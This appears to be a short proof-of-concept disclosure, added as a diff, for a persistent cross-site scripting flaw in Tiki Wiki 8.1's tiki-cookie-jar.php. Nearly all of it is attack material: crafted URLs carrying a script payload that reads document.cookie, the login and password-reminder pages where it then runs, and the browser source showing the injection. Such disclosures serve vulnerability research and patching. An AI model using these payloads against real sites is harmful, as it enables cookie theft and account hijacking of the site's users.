@@ -1,0 +1,34 @@
+Tested with Firefox 7.01
+
+Visit this URL
+
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&amp;xss=&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; -&gt; blank site
+
+But when you visit one of this pages, the XSS will be executed
+
+http://www.example.com/tiki-8.1/tiki-login.php
+http://www.example.com/tiki-8.1/tiki-remind_password.php
+
+// browser source code
+
+show_errors: &#039;y&#039;,
+		xss: &#039;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;
+};
+
+Another example:
+
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&amp;xss1=&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&amp;xss2=&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&amp;xss3=&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+All of them will be executed!
+
+// browser source code
+
+show_errors: &#039;y&#039;,
+	xss1: &#039;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;,
+	xss2: &#039;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;,
+	xss3: &#039;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;
+};
+
+
